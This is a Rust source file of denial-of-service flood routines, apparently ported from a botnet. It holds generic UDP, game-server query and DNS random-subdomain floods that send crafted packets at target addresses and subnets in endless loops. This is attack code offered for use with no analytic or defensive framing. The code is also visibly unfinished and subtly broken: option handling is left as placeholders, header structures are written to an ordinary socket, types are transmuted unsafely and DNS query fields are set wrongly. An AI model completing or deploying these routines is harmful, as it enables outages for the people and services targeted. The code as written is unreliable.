use std::ffi::CStr;
use std::fs::File;
use std::io::Read;
use std::net::{Ipv4Addr, SocketAddrV4, UdpSocket};
use std::os::unix::io::AsRawFd;
use std::ptr;
use std::slice;
use std::thread;
use std::time::Duration;

const LOCAL_ADDR: Ipv4Addr = Ipv4Addr::new(127, 0, 0, 1);

#[repr(C)]
struct IpHeader {
    version_ihl: u8,
    tos: u8,
    total_length: u16,
    id: u16,
    frag_offset: u16,
    ttl: u8,
    protocol: u8,
    checksum: u16,
    src_addr: u32,
    dest_addr: u32,
}

#[repr(C)]
struct UdpHeader {
    src_port: u16,
    dest_port: u16,
    length: u16,
    checksum: u16,
}

#[repr(C)]
struct DnsHeader {
    id: u16,
    opts: u16,
    qdcount: u16,
    ancount: u16,
    nscount: u16,
    arcount: u16,
}

#[repr(C)]
struct DnsQuestion {
    qtype: u16,
    qclass: u16,
}

fn get_dns_resolver() -> Ipv4Addr {
    let resolv_path = "/etc/resolv.conf";
    if let Ok(mut file) = File::open(resolv_path) {
        let mut contents = String::new();
        if file.read_to_string(&mut contents).is_ok() {
            for line in contents.lines() {
                if line.starts_with("nameserver") {
                    if let Some(ip_str) = line.split_whitespace().nth(1) {
                        if let Ok(ip) = ip_str.parse() {
                            return ip;
                        }
                    }
                }
            }
        }
    }

    match rand::random::<u8>() % 4 {
        0 => Ipv4Addr::new(8, 8, 8, 8),
        1 => Ipv4Addr::new(74, 82, 42, 42),
        2 => Ipv4Addr::new(64, 6, 64, 6),
        _ => Ipv4Addr::new(4, 2, 2, 2),
    }
}

fn attack_udp_generic(targs_len: u8, targs: &[AttackTarget], opts_len: u8, opts: &[AttackOption]) {
    let mut pkts: Vec<Vec<u8>> = vec![vec![0; 1510]; targs_len as usize];
    let ip_tos = 0; // Replace with actual option extraction
    let ip_ident = 0xffff; // Replace with actual option extraction
    let ip_ttl = 64; // Replace with actual option extraction
    let dont_frag = false; // Replace with actual option extraction
    let sport = 0xffff; // Replace with actual option extraction
    let dport = 0xffff; // Replace with actual option extraction
    let mut data_len = 512; // Replace with actual option extraction
    let data_rand = true; // Replace with actual option extraction
    let source_ip = LOCAL_ADDR; // Replace with actual option extraction

    if data_len > 1460 {
        data_len = 1460;
    }

    let socket = UdpSocket::bind("0.0.0.0:0").expect("Failed to create socket");
    socket.set_nonblocking(true).expect("Cannot set non-blocking");

    for i in 0..targs_len {
        let pkt = &mut pkts[i as usize];
        let iph = unsafe { &mut *(pkt.as_mut_ptr() as *mut IpHeader) };
        let udph = unsafe { &mut *(pkt.as_mut_ptr().add(std::mem::size_of::<IpHeader>()) as *mut UdpHeader) };

        iph.version_ihl = (4 << 4) | 5;
        iph.tos = ip_tos;
        iph.total_length = (std::mem::size_of::<IpHeader>() + std::mem::size_of::<UdpHeader>() + data_len) as u16;
        iph.id = ip_ident;
        iph.frag_offset = if dont_frag { 1 << 14 } else { 0 };
        iph.ttl = ip_ttl;
        iph.protocol = libc::IPPROTO_UDP as u8;
        iph.src_addr = u32::from(source_ip).to_be();
        iph.dest_addr = u32::from(targs[i as usize].addr).to_be();

        udph.src_port = sport;
        udph.dest_port = dport;
        udph.length = (std::mem::size_of::<UdpHeader>() + data_len) as u16;
    }

    while true {
        for i in 0..targs_len {
            let pkt = &mut pkts[i as usize];
            let iph = unsafe { &mut *(pkt.as_mut_ptr() as *mut IpHeader) };
            let udph = unsafe { &mut *(pkt.as_mut_ptr().add(std::mem::size_of::<IpHeader>()) as *mut UdpHeader) };
            let data = &mut pkt[std::mem::size_of::<IpHeader>() + std::mem::size_of::<UdpHeader>()..];

            if targs[i as usize].netmask < 32 {
                let addr = u32::from(targs[i as usize].addr);
                iph.dest_addr = (addr + (rand::random::<u32>() >> targs[i as usize].netmask)).to_be();
            }

            if source_ip == Ipv4Addr::new(255, 255, 255, 255) {
                iph.src_addr = rand::random::<u32>().to_be();
            }

            if ip_ident == 0xffff {
                iph.id = rand::random::<u16>();
            }
            if sport == 0xffff {
                udph.src_port = rand::random::<u16>();
            }
            if dport == 0xffff {
                udph.dest_port = rand::random::<u16>();
            }

            if data_rand {
                rand::thread_rng().fill(data);
            }

            iph.checksum = 0;
            iph.checksum = checksum_generic(iph);

            udph.checksum = 0;
            udph.checksum = checksum_tcpudp(iph, udph, udph.length);

            let sock_addr = SocketAddrV4::new(Ipv4Addr::from(u32::from_be(iph.dest_addr)), u16::from_be(udph.dest_port));
            let sock_addr_in: libc::sockaddr_in = unsafe { std::mem::transmute(sock_addr) };

            unsafe {
                libc::sendto(
                    socket.as_raw_fd(),
                    pkt.as_ptr() as *const libc::c_void,
                    pkt.len(),
                    libc::MSG_NOSIGNAL,
                    &sock_addr_in as *const _ as *const libc::sockaddr,
                    std::mem::size_of::<libc::sockaddr_in>() as u32,
                );
            }
        }
    }
}

fn attack_udp_vse(targs_len: u8, targs: &[AttackTarget], opts_len: u8, opts: &[AttackOption]) {
    let mut pkts: Vec<Vec<u8>> = vec![vec![0; 128]; targs_len as usize];
    let ip_tos = 0; // Replace with actual option extraction
    let ip_ident = 0xffff; // Replace with actual option extraction
    let ip_ttl = 64; // Replace with actual option extraction
    let dont_frag = false; // Replace with actual option extraction
    let sport = 0xffff; // Replace with actual option extraction
    let dport = 27015; // Replace with actual option extraction

    // Retrieve the vse_payload from the table (needs to be implemented)
    let vse_payload = ""; // Placeholder
    let vse_payload_len = vse_payload.len();

    let socket = UdpSocket::bind("0.0.0.0:0").expect("Failed to create socket");
    socket.set_nonblocking(true).expect("Cannot set non-blocking");

    for i in 0..targs_len {
        let pkt = &mut pkts[i as usize];
        let iph = unsafe { &mut *(pkt.as_mut_ptr() as *mut IpHeader) };
        let udph = unsafe { &mut *(pkt.as_mut_ptr().add(std::mem::size_of::<IpHeader>()) as *mut UdpHeader) };
        let data = &mut pkt[std::mem::size_of::<IpHeader>() + std::mem::size_of::<UdpHeader>()..];

        iph.version_ihl = (4 << 4) | 5;
        iph.tos = ip_tos;
        iph.total_length = (std::mem::size_of::<IpHeader>() + std::mem::size_of::<UdpHeader>() + 4 + vse_payload_len) as u16;
        iph.id = ip_ident;
        iph.frag_offset = if dont_frag { 1 << 14 } else { 0 };
        iph.ttl = ip_ttl;
        iph.protocol = libc::IPPROTO_UDP as u8;
        iph.src_addr = u32::from(LOCAL_ADDR).to_be();
        iph.dest_addr = u32::from(targs[i as usize].addr).to_be();

        udph.src_port = sport;
        udph.dest_port = dport;
        udph.length = (std::mem::size_of::<UdpHeader>() + 4 + vse_payload_len) as u16;

        data[..4].copy_from_slice(&[0xff, 0xff, 0xff, 0xff]);
        data[4..].copy_from_slice(vse_payload.as_bytes());
    }

    while true {
        for i in 0..targs_len {
            let pkt = &mut pkts[i as usize];
            let iph = unsafe { &mut *(pkt.as_mut_ptr() as *mut IpHeader) };
            let udph = unsafe { &mut *(pkt.as_mut_ptr().add(std::mem::size_of::<IpHeader>()) as *mut UdpHeader) };

            if targs[i as usize].netmask < 32 {
                let addr = u32::from(targs[i as usize].addr);
                iph.dest_addr = (addr + (rand::random::<u32>() >> targs[i as usize].netmask)).to_be();
            }

            if ip_ident == 0xffff {
                iph.id = rand::random::<u16>();
            }
            if sport == 0xffff {
                udph.src_port = rand::random::<u16>();
            }
            if dport == 0xffff {
                udph.dest_port = rand::random::<u16>();
            }

            iph.checksum = 0;
            iph.checksum = checksum_generic(iph);

            udph.checksum = 0;
            udph.checksum = checksum_tcpudp(iph, udph, udph.length);

            let sock_addr = SocketAddrV4::new(Ipv4Addr::from(u32::from_be(iph.dest_addr)), u16::from_be(udph.dest_port));
            let sock_addr_in: libc::sockaddr_in = unsafe { std::mem::transmute(sock_addr) };

            unsafe {
                libc::sendto(
                    socket.as_raw_fd(),
                    pkt.as_ptr() as *const libc::c_void,
                    pkt.len(),
                    libc::MSG_NOSIGNAL,
                    &sock_addr_in as *const _ as *const libc::sockaddr,
                    std::mem::size_of::<libc::sockaddr_in>() as u32,
                );
            }
        }
    }
}

fn attack_udp_dns(targs_len: u8, targs: &[AttackTarget], opts_len: u8, opts: &[AttackOption]) {
    let mut pkts: Vec<Vec<u8>> = vec![vec![0; 600]; targs_len as usize];
    let ip_tos = 0; // Replace with actual option extraction
    let ip_ident = 0xffff; // Replace with actual option extraction
    let ip_ttl = 64; // Replace with actual option extraction
    let dont_frag = false; // Replace with actual option extraction
    let sport = 0xffff; // Replace with actual option extraction
    let dport = 53; // Replace with actual option extraction
    let dns_hdr_id = 0xffff; // Replace with actual option extraction
    let data_len = 12; // Replace with actual option extraction
    let domain = "example.com"; // Placeholder for actual domain extraction
    let domain_len = domain.len();
    let dns_resolver = get_dns_resolver();

    let socket = UdpSocket::bind("0.0.0.0:0").expect("Failed to create socket");
    socket.set_nonblocking(true).expect("Cannot set non-blocking");

    for i in 0..targs_len {
        let pkt = &mut pkts[i as usize];
        let iph = unsafe { &mut *(pkt.as_mut_ptr() as *mut IpHeader) };
        let udph = unsafe { &mut *(pkt.as_mut_ptr().add(std::mem::size_of::<IpHeader>()) as *mut UdpHeader) };
        let dnsh = unsafe { &mut *(pkt.as_mut_ptr().add(std::mem::size_of::<IpHeader>() + std::mem::size_of::<UdpHeader>()) as *mut DnsHeader) };
        let qname = unsafe { pkt.as_mut_ptr().add(std::mem::size_of::<IpHeader>() + std::mem::size_of::<UdpHeader>() + std::mem::size_of::<DnsHeader>()) as *mut u8 };
        let mut curr_lbl = qname;

        iph.version_ihl = (4 << 4) | 5;
        iph.tos = ip_tos;
        iph.total_length = (std::mem::size_of::<IpHeader>() + std::mem::size_of::<UdpHeader>() + std::mem::size_of::<DnsHeader>() + 1 + data_len + 2 + domain_len + std::mem::size_of::<DnsQuestion>()) as u16;
        iph.id = ip_ident;
        iph.frag_offset = if dont_frag { 1 << 14 } else { 0 };
        iph.ttl = ip_ttl;
        iph.protocol = libc::IPPROTO_UDP as u8;
        iph.src_addr = u32::from(LOCAL_ADDR).to_be();
        iph.dest_addr = u32::from(dns_resolver).to_be();

        udph.src_port = sport;
        udph.dest_port = dport;
        udph.length = (std::mem::size_of::<UdpHeader>() + std::mem::size_of::<DnsHeader>() + 1 + data_len + 2 + domain_len + std::mem::size_of::<DnsQuestion>()) as u16;

        dnsh.id = dns_hdr_id;
        dnsh.opts = 1 << 8; // Recursion desired
        dnsh.qdcount = 1;

        unsafe {
            *curr_lbl = data_len as u8;
            curr_lbl = curr_lbl.add(1 + data_len as usize);

            for (i, c) in domain.chars().enumerate() {
                if c == '.' {
                    *curr_lbl = i as u8;
                    curr_lbl = curr_lbl.add(1);
                } else {
                    *curr_lbl = c as u8;
                    curr_lbl = curr_lbl.add(1);
                }
            }
        }

        let dnst = unsafe { &mut *(curr_lbl.add(1) as *mut DnsQuestion) };
        dnst.qtype = libc::htons(libc::IPPROTO_UDP as u16);
        dnst.qclass = libc::htons(libc::IPPROTO_IP as u16);
    }

    while true {
        for i in 0..targs_len {
            let pkt = &mut pkts[i as usize];
            let iph = unsafe { &mut *(pkt.as_mut_ptr() as *mut IpHeader) };
            let udph = unsafe { &mut *(pkt.as_mut_ptr().add(std::mem::size_of::<IpHeader>()) as *mut UdpHeader) };
            let dnsh = unsafe { &mut *(pkt.as_mut_ptr().add(std::mem::size_of::<IpHeader>() + std::mem::size_of::<UdpHeader>()) as *mut DnsHeader) };
            let qrand = unsafe { pkt.as_mut_ptr().add(std::mem::size_of::<IpHeader>() + std::mem::size_of::<UdpHeader>() + std::mem::size_of::<DnsHeader>() + 1) };

            if ip_ident == 0xffff {
                iph.id = rand::random::<u16>();
            }
            if sport == 0xffff {
                udph.src_port = rand::random::<u16>();
            }
            if dport == 0xffff {
                udph.dest_port = rand::random::<u16>();
            }

            if dns_hdr_id == 0xffff {
                dnsh.id = rand::random::<u16>();
            }

            rand::thread_rng().fill(unsafe { slice::from_raw_parts_mut(qrand, data_len as usize) });

            iph.checksum = 0;
            iph.checksum = checksum_generic(iph);

            udph.checksum = 0;
            udph.checksum = checksum_tcpudp(iph, udph, udph.length);

            let sock_addr = SocketAddrV4::new(Ipv4Addr::from(u32::from_be(iph.dest_addr)), u16::from_be(udph.dest_port));
            let sock_addr_in: libc::sockaddr_in = unsafe { std::mem::transmute(sock_addr) };

            unsafe {
                libc::sendto(
                    socket.as_raw_fd(),
                    pkt.as_ptr() as *const libc::c_void,
                    pkt.len(),
                    libc::MSG_NOSIGNAL,
                    &sock_addr_in as *const _ as *const libc::sockaddr,
                    std::mem::size_of::<libc::sockaddr_in>() as u32,
                );
            }
        }
    }
}

fn attack_udp_plain(targs_len: u8, targs: &[AttackTarget], opts_len: u8, opts: &[AttackOption]) {
    let mut pkts: Vec<Vec<u8>> = vec![vec![0; 65535]; targs_len as usize];
    let mut fds: Vec<i32> = vec![-1; targs_len as usize];
    let dport = 0xffff; // Replace with actual option extraction
    let sport = 0xffff; // Replace with actual option extraction
    let data_len = 512; // Replace with actual option extraction
    let data_rand = true; // Replace with actual option extraction
    let bind_addr = libc::sockaddr_in {
        sin_family: libc::AF_INET as u16,
        sin_port: sport,
        sin_addr: libc::in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };

    let socket = UdpSocket::bind("0.0.0.0:0").expect("Failed to create socket");
    socket.set_nonblocking(true).expect("Cannot set non-blocking");

    for i in 0..targs_len {
        let pkt = &mut pkts[i as usize];

        if dport == 0xffff {
            targs[i as usize].sock_addr.sin_port = rand::random::<u16>();
        } else {
            targs[i as usize].sock_addr.sin_port = dport;
        }

        fds[i as usize] = socket.as_raw_fd();

        if unsafe { libc::bind(fds[i as usize], &bind_addr as *const _ as *const libc::sockaddr, std::mem::size_of_val(&bind_addr) as u32) } == -1 {
            eprintln!("Failed to bind UDP socket");
        }

        if targs[i as usize].netmask < 32 {
            targs[i as usize].sock_addr.sin_addr.s_addr = u32::from(targs[i as usize].addr).to_be() + (rand::random::<u32>() >> targs[i as usize].netmask);
        }

        if unsafe { libc::connect(fds[i as usize], &targs[i as usize].sock_addr as *const _ as *const libc::sockaddr, std::mem::size_of_val(&targs[i as usize].sock_addr) as u32) } == -1 {
            eprintln!("Failed to connect UDP socket");
        }
    }

    while true {
        for i in 0..targs_len {
            let data = &mut pkts[i as usize];

            if data_rand {
                rand::thread_rng().fill(data);
            }

            unsafe {
                libc::send(fds[i as usize], data.as_ptr() as *const libc::c_void, data_len as usize, libc::MSG_NOSIGNAL);
            }
        }
    }
}
